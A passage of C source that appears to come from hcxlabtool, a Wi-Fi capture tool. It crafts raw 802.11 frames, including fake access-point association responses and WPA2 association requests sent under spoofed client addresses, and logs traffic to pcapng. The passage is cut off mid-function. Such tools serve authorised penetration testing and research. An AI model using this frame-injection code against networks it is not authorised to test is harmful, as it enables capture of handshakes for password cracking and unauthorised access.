#define _GNU_SOURCE
#include <ctype.h>
#include <getopt.h>
#include <ifaddrs.h>
#include <inttypes.h>
#include <dirent.h>
#include <signal.h>
#include <stdlib.h>
#include <time.h>
#include <arpa/inet.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <linux/filter.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/time.h>

#include "include/hcxlabtool.h"
#include "include/wireless-lite.h"
#include "include/rpigpio.h"
#include "include/ieee80211.c"
#include "include/pcap.c"

/*===========================================================================*/
/* global var */

static bool rebootflag;
static bool poweroffflag;
static int onsigterm;
static int ongpiobutton;
static int ontot;
static int onerror;
static struct timeval tv;
static struct timeval tvold;
static struct timeval tvoldled;
static struct timeval tvtot;
static struct timeval tvlast;
static unsigned long int rpisn;
static uint64_t timestamp;
static uint64_t tfctimestamp;
static uint64_t mytime;
static int staytime;
static uint32_t m2attempts;

static scanlist_t *ptrscanlist;

static bssidlist_t *bssidlist;
static int rgbssidlistmax;
static int rgbssidlistp;
static int rgbssidlistprp;
static rgbssidlist_t *rgbssidlist;
static clientlist_t *clientlist;

static char ifname[IFNAMSIZ +1];
static uint8_t ifmac[6];
static uint8_t ifvirtmac[6];
static struct sock_fprog bpf;

static int fd_socket;
static int fd_pcapng;

static bool wantstopflag;
static int gpiostatusled;
static int gpiobutton;
static int errorcount;
static int lasterrorcount;

static time_t fdrxsectimer;
static long int fdrxnsectimer;

static enhanced_packet_block_t *epbhdr;
static enhanced_packet_block_t *epbhdrown;

static int packetlen;
static int packetoutlen;
static uint8_t *packetptr;
static uint8_t *packetoutptr;
static mac_t *macfrx;
static uint8_t *ieee82011ptr;
static uint32_t ieee82011len;
static uint8_t *payloadptr;
static uint32_t payloadlen;
static uint8_t *llcptr;
static llc_t *llc;
#if defined(DUMPWPA) || defined(DUMPWEP)
static uint8_t *mpduptr;
static mpdu_t *mpdu;
#endif
static uint32_t ouirgap;
static uint32_t nicrgap;
static uint8_t macrgbwcopen[6];
static uint8_t macrgap[6];
static uint8_t anonce[32];
static uint32_t ouirgclient;
static uint32_t nicrgclient;
static uint8_t macrgclient[6];
static uint8_t snonce[32];
static uint64_t rgrc;

static uint16_t deauthenticationsequence;
static uint16_t clientsequence;
static uint16_t apsequence;
static uint16_t beaconsequence;

static uint8_t weakcandidatelen;

static uint8_t hdradiotap[] =
{
0x00, 0x00, /* radiotap version and padding */
0x0c, 0x00, /* radiotap header length */
0x06, 0x80, 0x00, 0x00, /* bitmap */
0x00, /* all cleared */
0x02, /* rate */
0x18, 0x00 /* tx flags */
};
#define HDRRT_SIZE sizeof(hdradiotap)

static uint8_t hdradiotap_ack[] =
{
0x00, 0x00, /* radiotap version and padding */
0x0c, 0x00, /* radiotap header length */
0x06, 0x80, 0x00, 0x00, /* bitmap */
0x00, /* all cleared */
0x02, /* rate */
0x00, 0x00 /* tx flags */
};
#define HDRRTACK_SIZE sizeof(hdradiotap_ack)

static scanlist_t scanlist[SCANLIST_MAX +1];

static char weakcandidate[64];

static uint8_t mac_pending[6];

static uint8_t epb[PCAPNG_MAXSNAPLEN *2];
static uint8_t epbown[PCAPNG_MAXSNAPLEN *2];
static uint8_t epbown_m1[PCAPNG_MAXSNAPLEN *2];
/*===========================================================================*/
/*===========================================================================*/
static inline void debugmac3(uint8_t *mac1, uint8_t *mac2, uint8_t *mac3, char *message)
{
fprintf(stdout, "%02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %4d %3d %s\n", mac1[0], mac1[1], mac1[2], mac1[3], mac1[4], mac1[5], mac2[0], mac2[1], mac2[2], mac2[3], mac2[4], mac2[5], mac3[0], mac3[1], mac3[2], mac3[3], mac3[4], mac3[5], ptrscanlist->frequency, ptrscanlist->channel, message);
return;
}
/*===========================================================================*/
static inline void debugmac2(uint8_t *mac1, uint8_t *mac2, char *message)
{
fprintf(stdout, "%02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x  %4d %3d %s\n", mac1[0], mac1[1], mac1[2], mac1[3], mac1[4], mac1[5], mac2[0], mac2[1], mac2[2], mac2[3], mac2[4], mac2[5], ptrscanlist->frequency, ptrscanlist->channel, message);
return;
}
/*===========================================================================*/
static inline void debugmac1(uint8_t *mac1, char *message)
{
fprintf(stdout, "%02x%02x%02x%02x%02x%02x %4d %3d %s\n", mac1[0], mac1[1], mac1[2], mac1[3], mac1[4], mac1[5], ptrscanlist->frequency, ptrscanlist->channel, message);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void globalclose()
{
static int p;

signal(SIGINT, SIG_DFL);
if(bpf.filter != NULL)
	{
	if(fd_socket > 0) setsockopt(fd_socket, SOL_SOCKET, SO_DETACH_FILTER, &bpf, sizeof(bpf));
	free(bpf.filter);
	}
if(fd_socket > 0) close(fd_socket);
if(fd_pcapng > 0) close(fd_pcapng);
if(bssidlist != NULL)
	{
	for(p = 0; p < BSSIDLIST_MAX +1; p++)
		{
		if((bssidlist +p)->bssidinfo != NULL) free((bssidlist +p)->bssidinfo);
		}
	free(bssidlist);
	}
if(rgbssidlist != NULL) free(rgbssidlist);
if(clientlist != NULL) free(clientlist);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void writeepb()
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdr = (enhanced_packet_block_t*)epb;
epblen = EPB_SIZE;
epbhdr->block_type = EPBID;
epbhdr->interface_id = 0;
epbhdr->cap_len = packetlen;
epbhdr->org_len = packetlen;
epbhdr->timestamp_high = timestamp >> 32;
epbhdr->timestamp_low = (uint32_t)timestamp &0xffffffff;
padding = (4 -(epbhdr->cap_len %4)) %4;
epblen += packetlen;
memset(&epb[epblen], 0, padding);
epblen += padding;
epblen += addoption(epb +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epb +epblen);
epblen += TOTAL_SIZE;
epbhdr->total_length = epblen;
totallenght->total_length = epblen;
written = write(fd_pcapng, &epb, epblen);
if(written != epblen) errorcount++;
return;	
}
/*===========================================================================*/
static inline void writeepbown_m1(int fd, int packetlenown)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdrown = (enhanced_packet_block_t*)epbown_m1;
epblen = EPB_SIZE;
epbhdrown->block_type = EPBID;
epbhdrown->interface_id = 0;
epbhdrown->cap_len = packetlenown;
epbhdrown->org_len = packetlenown;
epbhdrown->timestamp_high = timestamp >> 32;
epbhdrown->timestamp_low = (uint32_t)timestamp &0xffffffff;
padding = (4 -(epbhdrown->cap_len %4)) %4;
epblen += packetlenown;
memset(&epbown_m1[epblen], 0, padding);
epblen += padding;
epblen += addoption(epbown_m1 +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epbown_m1 +epblen);
epblen += TOTAL_SIZE;
epbhdrown->total_length = epblen;
totallenght->total_length = epblen;
written = write(fd, &epbown_m1, epblen);
if(written != epblen) errorcount++;
return;	
}
/*===========================================================================*/
static inline void writeepbown(int fd, int packetlenown)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdrown = (enhanced_packet_block_t*)epbown;
epblen = EPB_SIZE;
epbhdrown->block_type = EPBID;
epbhdrown->interface_id = 0;
epbhdrown->cap_len = packetlenown;
epbhdrown->org_len = packetlenown;
epbhdrown->timestamp_high = timestamp >> 32;
epbhdrown->timestamp_low = (uint32_t)timestamp &0xffffffff;
padding = (4 -(epbhdrown->cap_len %4)) %4;
epblen += packetlenown;
memset(&epbown[epblen], 0, padding);
epblen += padding;
epblen += addoption(epbown +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epbown +epblen);
epblen += TOTAL_SIZE;
epbhdrown->total_length = epblen;
totallenght->total_length = epblen;
written = write(fd, &epbown, epblen);
if(written != epblen) errorcount++;
return;	
}
/*===========================================================================*/
static inline void fdwrite()
{
static int fdnum;
static fd_set txfds;
static struct timespec tsfdtx;

FD_ZERO(&txfds);
FD_SET(fd_socket, &txfds);
tsfdtx.tv_sec = FDTXSECTIMER;
tsfdtx.tv_nsec = 0;
fdnum = pselect(fd_socket +1, NULL, &txfds, NULL, &tsfdtx, NULL);
if(fdnum < 0)
	{
	errorcount++;
	return;
	}
if(FD_ISSET(fd_socket, &txfds))
	{
	if(packetoutlen == write(fd_socket, packetoutptr, packetoutlen)) return;
	}
errorcount++;
return;	
}
/*===========================================================================*/
static inline void send_reassociation_resp()
{
static mac_t *macftx;
static reassocrepf_t *reassocid;

static const uint8_t reassociationresponsedata[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define REASSOCIATIONRESPONSE_SIZE sizeof(reassociationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPONSE_SIZE +ASSOCIATIONRESPFRAME_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = apsequence++ << 4;
if(apsequence > 4095) apsequence = 1;
reassocid = (reassocrepf_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
reassocid->capabilities = 0x0431;
reassocid->statuscode = 0x0000;
reassocid->aid = 0xc001;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPFRAME_SIZE], &reassociationresponsedata, REASSOCIATIONRESPONSE_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPFRAME_SIZE +REASSOCIATIONRESPONSE_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_reassociation_resp_5()
{
static mac_t *macftx;
static reassocrepf_t *reassocid;

static const uint8_t reassociationresponsedata[] =
{
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define REASSOCIATIONRESPONSE_SIZE sizeof(reassociationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPONSE_SIZE +ASSOCIATIONRESPFRAME_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = apsequence++ << 4;
if(apsequence > 4095) apsequence = 1;
reassocid = (reassocrepf_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
reassocid->capabilities = 0x0431;
reassocid->statuscode = 0x0000;
reassocid->aid = 0xc001;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPFRAME_SIZE], &reassociationresponsedata, REASSOCIATIONRESPONSE_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPFRAME_SIZE +REASSOCIATIONRESPONSE_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_association_resp()
{
static mac_t *macftx;
static capaid_t *capaid;
static const uint8_t associationresponsedata[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = apsequence++ << 4;
if(apsequence > 4095) apsequence = 1;
capaid = (capaid_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capaid->capabilities = 0x0431;
capaid->statuscode = 0x0000;
capaid->aid = 0xc001;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAID_SIZE], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAID_SIZE +ASSOCIATIONRESPONSE_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_association_resp_5()
{
static mac_t *macftx;
static capaid_t *capaid;
static const uint8_t associationresponsedata[] =
{
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: Extended Capabilities (8 octets) */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_RESP;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->duration = 0x013a;
macftx->sequence = apsequence++ << 4;
if(apsequence > 4095) apsequence = 1;
capaid = (capaid_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capaid->capabilities = 0x0431;
capaid->statuscode = 0x0000;
capaid->aid = 0xc001;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAID_SIZE], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAID_SIZE +ASSOCIATIONRESPONSE_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_null()
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +1);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_NULLFUNC;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr2, 6);
macftx->to_ds = 1;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa2_cl(int p)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa2data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x80, 0x00,
/* HT capabilites */
0x2d, 0x1a, 0x6e, 0x18, 0x1f, 0xff, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA2_SIZE sizeof(associationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = (bssidlist +p)->bssidinfo->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &associationrequestwpa2data, ASSOCIATIONREQUESTWPA2_SIZE);
if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x17] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x17] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x1d] = CS_CCMP;
if(((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x23] = AK_PSKSHA256;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA2_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa2_cl_5(int p)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa2data[] =
{
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x80, 0x00,
/* HT capabilites */
0x2d, 0x1a, 0x6e, 0x18, 0x1f, 0xff, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA2_SIZE sizeof(associationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, (bssidlist +p)->bssidinfo->macclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = (bssidlist +p)->bssidinfo->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE], &associationrequestwpa2data, ASSOCIATIONREQUESTWPA2_SIZE);
if(((bssidlist +p)->bssidinfo->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x11] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x11] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x17] = CS_CCMP;
if(((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x1d] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +0x1d] = AK_PSKSHA256;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +(bssidlist +p)->bssidinfo->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA2_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa2(int p)
{
static mac_t *macftx;
static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa2data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x80, 0x00,
/* HT capabilites */
0x2d, 0x1a, 0x6e, 0x18, 0x1f, 0xff, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA2_SIZE sizeof(associationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +(bssidlist +p)->bssidinfo->essidlen);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, (bssidlist +p)->mac, 6);
memcpy(macftx->addr2, macrgclient, 6);
memcpy(macftx->addr3, (bssidlist +p)->mac, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = (bssidlist +p)->bssidinfo->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], (bssidlist +p)->bssidinfo->essid, (bssidlist +p)->bssidinfo->essidlen);
